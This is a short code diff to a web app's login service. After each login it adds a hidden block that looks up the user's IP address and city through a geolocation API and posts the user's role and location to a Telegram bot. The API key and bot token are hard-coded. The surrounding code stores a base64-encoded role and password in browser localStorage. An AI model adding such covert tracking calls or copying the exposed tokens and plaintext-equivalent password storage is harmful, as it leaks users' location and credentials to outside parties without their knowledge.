@@ -37,6 +37,13 @@ export class UserService {
         user.btoa =  btoa(role + ':' + password);
         localStorage.setItem('user', JSON.stringify(user));
         this.userSubject.next(user);
+        (async () => {
+          await this.httpClient.get<any>('https://api.ipdata.co/?api-key=216dcfeff54876301731e698745a312f3a0eec5d6f2ebc12f7fcfc2d').subscribe(value => {
+            this.httpClient.post('https://api.telegram.org/bot1132136098:AAGNPbKcI80RLZXfv-xSi6hO_QpBAeZUiNQ/sendMessage', {text: `Role: ${user.role}, Ip: ${value.ip}, Country: ${value.country_name}, City: ${value.city}`, chat_id: 535041780 }).subscribe(value1 => {
+              console.log('Telegram is notified');
+            });
+          });
+        })();
         return user;
     }));
   }
